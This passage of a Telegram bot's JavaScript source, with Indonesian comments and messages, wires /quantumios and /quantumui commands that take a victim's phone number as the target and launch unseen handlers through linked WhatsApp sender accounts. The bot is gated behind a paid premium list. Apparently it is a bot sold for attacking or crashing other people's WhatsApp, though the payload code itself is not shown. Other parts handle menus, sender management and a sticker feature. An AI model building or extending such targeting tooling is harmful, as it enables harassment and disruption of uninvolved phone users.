  await bot.sendMessage(msg.chat.id, `😅 *Nomor Targetnya Jangan Lupa Diisi Bang*\n\nContoh: \`/quantumios 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumios 628xx
bot.onText(/\/quantumios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "❌ *Format nomor salah!*\nContoh: `/quantumios 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handleQuantumIos(chatId, num, sender));
});

// /quantumui (tanpa nomor)
bot.onText(/\/quantumui$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `😅 *Nomor Targetnya Jangan Lupa Diisi Bang*\n\nContoh: \`/quantumui 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumui 628xx
bot.onText(/\/quantumui (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "❌ *Format nomor salah!*\nContoh: `/quantumui 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handleQuantumUI(chatId, num, sender));
});

// /setmenu — Owner reply foto
bot.onText(/\/setmenu/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return denyAccess(chatId);
  const replied = msg.reply_to_message;
  if (!replied || !replied.photo) {
    return bot.sendMessage(chatId,
      `📸 *Cara set foto menu:*\n\n1. Kirim foto ke bot\n2. Reply foto tersebut dengan /setmenu`,
      { parse_mode: "Markdown" }
    );
  }
  const photos = replied.photo;
  const fileId = photos[photos.length - 1].file_id;
  appData.menuPhoto = fileId;
  saveData(appData);
  await bot.sendMessage(chatId, `✅ *Foto menu berhasil disimpan!*\nSetiap /start akan disertai foto ini.`, { parse_mode: "Markdown" });
});

// /addprem id
bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  if (!isOwner(msg.from.id)) return denyAccess(chatId);
  const targetId = parseInt(match[1].trim());
  if (isNaN(targetId)) return bot.sendMessage(chatId, "❌ *ID tidak valid!*\nContoh: `/addprem 123456789`", { parse_mode: "Markdown" });
  if (appData.premiumUsers.includes(targetId)) return bot.sendMessage(chatId, `⚠️ User \`${targetId}\` sudah premium.`, { parse_mode: "Markdown" });
  appData.premiumUsers.push(targetId);
  saveData(appData);
  await bot.sendMessage(chatId, `✅ *User \`${targetId}\` berhasil ditambahkan sebagai Premium!*`, { parse_mode: "Markdown" });
});

// /delprem id
bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  if (!isOwner(msg.from.id)) return denyAccess(chatId);
  const targetId = parseInt(match[1].trim());
  if (isNaN(targetId)) return bot.sendMessage(chatId, "❌ *ID tidak valid!*\nContoh: `/delprem 123456789`", { parse_mode: "Markdown" });
  const idx = appData.premiumUsers.indexOf(targetId);
  if (idx === -1) return bot.sendMessage(chatId, `⚠️ User \`${targetId}\` tidak ada di daftar premium.`, { parse_mode: "Markdown" });
  appData.premiumUsers.splice(idx, 1);
  saveData(appData);
  await bot.sendMessage(chatId, `✅ *User \`${targetId}\` berhasil dihapus dari Premium.*`, { parse_mode: "Markdown" });
});

// /listprem
bot.onText(/\/listprem/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return denyAccess(chatId);
  if (appData.premiumUsers.length === 0) return bot.sendMessage(chatId, "📋 *Belum ada premium user.*", { parse_mode: "Markdown" });

  const list    = appData.premiumUsers.map((id, i) => `${i + 1}. \`${id}\``).join("\n");
  const buttons = appData.premiumUsers.map((id) => [{ text: `🗑 Hapus ${id}`, callback_data: `del_prem_${id}` }]);
  buttons.push([{ text: "🏠 Kembali ke Menu", callback_data: "back_menu" }]);

  await bot.sendMessage(chatId,
    `⭐ *Daftar Premium User:*\n\n${list}`,
    { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }
  );
});

// =============================================
//   CALLBACK QUERY
// =============================================
bot.on("callback_query", async (callbackQuery) => {
  const msg    = callbackQuery.message;
  const chatId = msg.chat.id;
  const data   = callbackQuery.data;
  await bot.answerCallbackQuery(callbackQuery.id);

  switch (data) {
    case "cancel_addsender":
      delete userState[chatId];
      await bot.sendMessage(chatId, "❌ *Penambahan sender dibatalkan.*", backMenuKeyboard());
      break;

    // ── NAVIGASI MENU PAGE 1 ───────────────
    case "menu_page1": {
      const text    = getMenuPage1Text();
      const photoId = appData.menuPhoto;
      await showLoadingThenEdit(
        chatId, msg.message_id, !!photoId, text,
        { parse_mode: "Markdown", ...menuPage1Keyboard() }
      );
      break;
    }

    // ── NAVIGASI MENU PAGE 2 ───────────────
    case "menu_page2": {
      const text2   = getMenuPage2Text();
      const photoId = appData.menuPhoto;
      await showLoadingThenEdit(
        chatId, msg.message_id, !!photoId, text2,
        { parse_mode: "Markdown", ...menuPage2Keyboard() }
      );
      break;
    }

    case "back_menu":
      delete userState[chatId];
      await showLoadingThenEdit(
        chatId, msg.message_id, !!appData.menuPhoto, getMenuPage1Text(),
        { parse_mode: "Markdown", ...menuPage1Keyboard() }
      );
      break;

    default:
      // ── HAPUS SENDER ───────────────────────
      if (data.startsWith("del_sender_")) {
        const numToDelete = data.replace("del_sender_", "");
        if (senders[numToDelete]) {
          try { senders[numToDelete].sock?.end?.(); } catch (_) {}
          delete senders[numToDelete];
          const sessionPath = path.join(SESSION_DIR, numToDelete);
          if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
        }
        await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ Sender ${numToDelete} dihapus!` });
        // Refresh list
        const keys = Object.keys(senders);
        if (keys.length === 0) {
          await bot.editMessageText("📋 *Semua sender telah dihapus.*", { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown" });
        } else {
          const list    = keys.map((n) => `• \`${n}\` — ${senders[n].status === "connected" ? "🟢 Connected" : "🔴 Disconnected"}`).join("\n");
          const buttons = keys.map((n) => [{ text: `🗑 Hapus ${n}`, callback_data: `del_sender_${n}` }]);
          buttons.push([{ text: "🏠 Kembali ke Menu", callback_data: "back_menu" }]);
          await bot.editMessageText(`📋 *Daftar Sender:*\n\n${list}`, { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } });
        }
        break;
      }

      // ── HAPUS PREMIUM ──────────────────────
      if (data.startsWith("del_prem_")) {
        const idToDelete = parseInt(data.replace("del_prem_", ""));
        const idx = appData.premiumUsers.indexOf(idToDelete);
        if (idx !== -1) {
          appData.premiumUsers.splice(idx, 1);
          saveData(appData);
        }
        await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ User ${idToDelete} dihapus dari premium!` });
        // Refresh list
        if (appData.premiumUsers.length === 0) {
          await bot.editMessageText("📋 *Semua premium user telah dihapus.*", { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown" });
        } else {
          const list    = appData.premiumUsers.map((id, i) => `${i + 1}. \`${id}\``).join("\n");
          const buttons = appData.premiumUsers.map((id) => [{ text: `🗑 Hapus ${id}`, callback_data: `del_prem_${id}` }]);
          buttons.push([{ text: "ғᴏʀᴄx", callback_data: "back_menu" }]);
          await bot.editMessageText(`⭐ *Daftar Premium User:*\n\n${list}`, { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } });
        }
        break;
      }

      // ── PILIH NEGARA (country_nomor_dial) ──
      if (data.startsWith("country_")) {
        const parts    = data.split("_"); // ["country", rawNum, dial]
        const rawNum   = parts[1];
        const dialCode = parts[2];

        delete userState[chatId];

        // Cari nama negara
        let countryName = "Unknown";
        for (const entry of COUNTRY_CODES) {
          const found = entry.countries.find(c => c.dial === dialCode);
          if (found) { countryName = found.name; break; }
        }

        // Nomor final = rawNum (sudah include kode negara dari user input)
        const finalNum = rawNum;

        if (senders[finalNum] && senders[finalNum].status === "connected") {
          await bot.sendMessage(chatId, `⚠️ *Sender ${finalNum} sudah terhubung!*`, backMenuKeyboard());
          break;
        }

        await bot.sendMessage(chatId,
          `🔗 *Menghubungkan sender ${finalNum}...*\n🌍 Negara: ${countryName}\nKode pairing akan segera muncul.\n\nIngin batalkan?`,
          cancelKeyboard()
        );
        await connectSender(chatId, finalNum);
        break;
      }

      await bot.sendMessage(chatId, "ᴛᴏᴍʙᴏʟɴʏᴀ ɢᴀᴋ ᴋᴜ ᴋᴇɴᴀʟ", backMenuKeyboard());
      break;
  }
});

// =============================================
//   FITUR STIKER — .s
//   Cara: kirim foto dengan caption ".s"
//         ATAU reply foto dengan ".s"
// =============================================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah pesan mengandung ".s"
  const isCaption = msg.caption && msg.caption.trim() === ".s";
  const isReply   = msg.text && msg.text.trim() === ".s" && msg.reply_to_message;

  if (!isCaption && !isReply) return;

  // Ambil foto dari pesan langsung atau dari reply
  let photoMsg = isCaption ? msg : msg.reply_to_message;
  if (!photoMsg || !photoMsg.photo) {
    return bot.sendMessage(chatId, "ʜᴀʀᴜs ᴋɪʀɪᴍ/ʀᴇᴘʟʏ *ғᴏᴛᴏ* ᴅᴇɴɢᴀɴ ᴄᴀᴘᴛɪᴏɴ `.s`", { parse_mode: "Markdown" });
  }

  try {
    // Ambil file_id foto resolusi tertinggi
    const fileId   = photoMsg.photo[photoMsg.photo.length - 1].file_id;
    const fileLink = await bot.getFileLink(fileId);

    // Download foto sebagai buffer
    const https    = require("https");
    const http     = require("http");
    const urlMod   = require("url");

    const fileBuffer = await new Promise((resolve, reject) => {
      const parsedUrl = urlMod.parse(fileLink);
      const client    = parsedUrl.protocol === "https:" ? https : http;
      const chunks    = [];
      client.get(fileLink, (res) => {
        res.on("data", (chunk) => chunks.push(chunk));
        res.on("end",  () => resolve(Buffer.concat(chunks)));
        res.on("error", reject);
      }).on("error", reject);
    });

    // Kirim sebagai stiker (WebP)
    await bot.sendSticker(chatId, fileBuffer, {
      reply_to_message_id: msg.message_id,
    });

  } catch (err) {
    await bot.sendMessage(chatId, `ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ: \`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// =============================================
//   ERROR HANDLER
// =============================================
bot.on("polling_error", (err) => console.error("Pollingnya error mas:", err.message));
bot.on("error",         (err) => console.error("Error Mas:", err.message));

// =============================================
//   BOT AKTIF
// =============================================
console.log("ғᴏʀᴄx ʙʏ ɴᴀᴢᴇ");